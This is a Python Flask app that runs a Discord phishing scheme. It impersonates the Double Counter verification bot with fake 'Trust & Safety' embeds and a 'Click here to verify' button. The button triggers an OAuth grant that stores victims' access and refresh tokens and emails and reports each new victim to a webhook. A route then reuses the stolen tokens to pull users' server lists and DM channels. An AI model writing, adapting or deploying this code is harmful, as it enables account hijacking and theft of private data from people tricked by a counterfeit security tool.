from flask import Flask, request, redirect, jsonify
import requests
import sqlite3
import json
import time
import os
import hashlib
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key')

# === CONFIGURATION ===
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://double-counter-clone.onrender.com/callback")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
BOT_TOKEN = os.getenv("BOT_TOKEN")
VERIFY_CHANNEL_ID = os.getenv("VERIFY_CHANNEL_ID", "1516478639858913322")

# === DATABASE SETUP ===
def init_db():
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        username TEXT,
        email TEXT,
        refresh_token TEXT,
        access_token TEXT,
        token_expiry INTEGER,
        guilds_cache TEXT,
        dms_cache TEXT,
        last_updated INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS rate_limits (
        bucket TEXT PRIMARY KEY,
        remaining INTEGER,
        reset_after INTEGER,
        last_update INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS cache (
        key TEXT PRIMARY KEY,
        data TEXT,
        timestamp INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

# === RATE LIMIT HANDLER ===
class RateLimiter:
    def __init__(self):
        self.cache = {}
    
    def get_bucket(self, bucket_name):
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("SELECT remaining, reset_after, last_update FROM rate_limits WHERE bucket = ?", (bucket_name,))
        row = c.fetchone()
        conn.close()
        if row:
            remaining, reset_after, last_update = row
            if time.time() - last_update > reset_after:
                return {"remaining": 10, "reset_after": 60, "last_update": int(time.time())}
            return {"remaining": remaining, "reset_after": reset_after, "last_update": last_update}
        return {"remaining": 10, "reset_after": 60, "last_update": int(time.time())}
    
    def update_bucket(self, bucket_name, remaining, reset_after):
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO rate_limits (bucket, remaining, reset_after, last_update) VALUES (?, ?, ?, ?)",
                  (bucket_name, remaining, reset_after, int(time.time())))
        conn.commit()
        conn.close()
    
    def wait_if_needed(self, bucket_name, headers=None):
        if headers and 'X-RateLimit-Remaining' in headers:
            remaining = int(headers['X-RateLimit-Remaining'])
            reset_after = int(headers.get('X-RateLimit-Reset-After', 60))
            if remaining <= 1:
                time.sleep(reset_after)
            self.update_bucket(bucket_name, remaining, reset_after)
            return
        bucket = self.get_bucket(bucket_name)
        if bucket["remaining"] <= 1:
            wait_time = bucket["reset_after"] - (time.time() - bucket["last_update"])
            if wait_time > 0:
                time.sleep(wait_time)
        self.update_bucket(bucket_name, max(0, bucket["remaining"] - 1), bucket["reset_after"])

rate_limiter = RateLimiter()

# === CACHED API REQUEST ===
def cached_request(method, url, bucket_name, headers=None, data=None, json_data=None, cache_ttl=300):
    cache_key = hashlib.md5(f"{method}{url}{str(data)}".encode()).hexdigest()
    
    if method == "GET":
        conn = sqlite3.connect('data.db')
        c = conn.cursor()
        c.execute("SELECT data, timestamp FROM cache WHERE key = ?", (cache_key,))
        row = c.fetchone()
        conn.close()
        if row and time.time() - row[1] < cache_ttl:
            return json.loads(row[0])
    
    rate_limiter.wait_if_needed(bucket_name)
    
    max_retries = 5
    for attempt in range(max_retries):
        try:
            kwargs = {"method": method, "url": url, "timeout": 30}
            if headers:
                kwargs["headers"] = headers
            if data:
                kwargs["data"] = data
            if json_data:
                kwargs["json"] = json_data
            
            response = requests.request(**kwargs)
            rate_limiter.wait_if_needed(bucket_name, response.headers)
            
            if response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', 5))
                time.sleep(retry_after)
                continue
            if response.status_code >= 500:
                time.sleep(2 ** attempt)
                continue
            
            if method == "GET" and response.status_code == 200:
                conn = sqlite3.connect('data.db')
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO cache (key, data, timestamp) VALUES (?, ?, ?)",
                          (cache_key, response.text, int(time.time())))
                conn.commit()
                conn.close()
            
            return response
        except Exception as e:
            print(f"API request failed (attempt {attempt+1}): {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
            raise
    
    return None

# === TOKEN REFRESH ===
def refresh_token(refresh_token):
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'refresh_token',
        'refresh_token': refresh_token,
    }
    response = cached_request(
        'POST',
        'https://discord.com/api/oauth2/token',
        'token_refresh',
        data=data
    )
    if response and response.status_code == 200:
        return response.json()
    return None

# === ROUTES ===
@app.route('/')
def index():
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )
    return redirect(auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code:
        return "No code provided", 400
    
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
    }
    
    response = cached_request(
        'POST',
        'https://discord.com/api/oauth2/token',
        'token_exchange',
        data=data
    )
    if not response or response.status_code != 200:
        return f"Token exchange failed: {response.text if response else 'No response'}", 400
    
    token_data = response.json()
    refresh_token = token_data['refresh_token']
    access_token = token_data['access_token']
    headers = {'Authorization': f'Bearer {access_token}'}
    
    user_response = cached_request(
        'GET',
        'https://discord.com/api/users/@me',
        'user_info',
        headers=headers
    )
    if not user_response or user_response.status_code != 200:
        return "Failed to get user info", 400
    
    user_data = user_response.json()
    user_id = user_data['id']
    
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, username, email, refresh_token, access_token, token_expiry, guilds_cache, dms_cache, last_updated) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (user_id, user_data['username'], user_data.get('email', ''), refresh_token, access_token, time.time() + 3600, '', '', int(time.time())))
    conn.commit()
    conn.close()
    
    if WEBHOOK_URL:
        try:
            payload = {"content": f"🎯 **New user:** {user_data['username']} ({user_id})"}
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass
    
    return """
    <html>
    <head><title>Verification Complete</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px; background: #0a0a0f; color: #fff;">
        <h1 style="color: #57F287;">✅ Verification Complete!</h1>
        <p>You can now access the server.</p>
        <script>setTimeout(() => window.close(), 2000);</script>
    </body>
    </html>
    """

@app.route('/send_embed')
def send_embed():
    if not BOT_TOKEN:
        return "BOT_TOKEN not set. Add BOT_TOKEN to .env", 400

    channel_id = VERIFY_CHANNEL_ID
    direct_oauth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )

    embed = {
        "title": "**bunni fg**",
        "description": (
            "**APP.**\n\n"
            "Verify to access this server\n"
            "This server uses **bunni fg** to block alt accounts and VPNs.\n\n"
            "**Server:** Serwer użytkownika imharm\n\n"
            "Double Counter is the best data-powered alt account and raid blocker on Discord. "
            "We provide instant verification based on 10+ factors. "
            "Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
        ),
        "color": 0x5865F2,
        "footer": {"text": f"Double Counter · Trust & Safety · {datetime.now().strftime('Today at %I:%M %p')}"},
        "timestamp": datetime.now().isoformat()
    }

    payload = {
        "embeds": [embed],
        "components": [{
            "type": 1,
            "components": [{
                "type": 2,
                "style": 5,
                "label": "Click here to verify",
                "url": direct_oauth_url
            }]
        }]
    }

    response = requests.post(
        f"https://discord.com/api/v10/channels/{channel_id}/messages",
        headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
        json=payload,
        timeout=30
    )

    if response.status_code == 200:
        return "✅ Embed sent to #verify!", 200
    else:
        return f"❌ Error: {response.text}", 400

@app.route('/send_webhook')
def send_webhook():
    if not WEBHOOK_URL:
        return "WEBHOOK_URL not set. Add to .env", 400

    direct_oauth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds%20connections%20messages.read"
    )

    embed = {
        "title": "**bunni fg**",
        "description": (
            "**APP.**\n\n"
            "Verify to access this server\n"
            "This server uses **bunni fg** to block alt accounts and VPNs.\n\n"
            "**Server:** Serwer użytkownika imharm\n\n"
            "Double Counter is the best data-powered alt account and raid blocker on Discord. "
            "We provide instant verification based on 10+ factors. "
            "Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
        ),
        "color": 0x5865F2,
        "footer": {"text": f"Double Counter · Trust & Safety · {datetime.now().strftime('Today at %I:%M %p')}"},
        "timestamp": datetime.now().isoformat()
    }

    payload = {
        "embeds": [embed],
        "components": [{
            "type": 1,
            "components": [{
                "type": 2,
                "style": 5,
                "label": "Click here to verify",
                "url": direct_oauth_url
            }]
        }]
    }

    response = requests.post(WEBHOOK_URL, json=payload, timeout=30)

    if response.status_code == 200:
        return "✅ Embed sent via webhook!", 200
    else:
        return f"❌ Error: {response.text}", 400

@app.route('/data/<user_id>')
def get_data(user_id):
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT refresh_token FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({"error": "User not found"}), 404
    
    refresh_token = row[0]
    token_data = refresh_token(refresh_token)
    if not token_data:
        return jsonify({"error": "Failed to refresh token"}), 500
    
    access_token = token_data['access_token']
    headers = {'Authorization': f'Bearer {access_token}'}
    
    guilds_response = cached_request(
        'GET',
        'https://discord.com/api/users/@me/guilds',
        'guilds',
        headers=headers
    )
    guilds = guilds_response.json() if guilds_response and guilds_response.status_code == 200 else []
    
    dms_response = cached_request(
        'GET',
        'https://discord.com/api/users/@me/channels',
        'dms',
        headers=headers
    )
    dms = dms_response.json() if dms_response and dms_response.status_code == 200 else []
    
    return jsonify({
        'user_id': user_id,
        'guilds': guilds,
        'dms': dms,
        'fetched_at': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
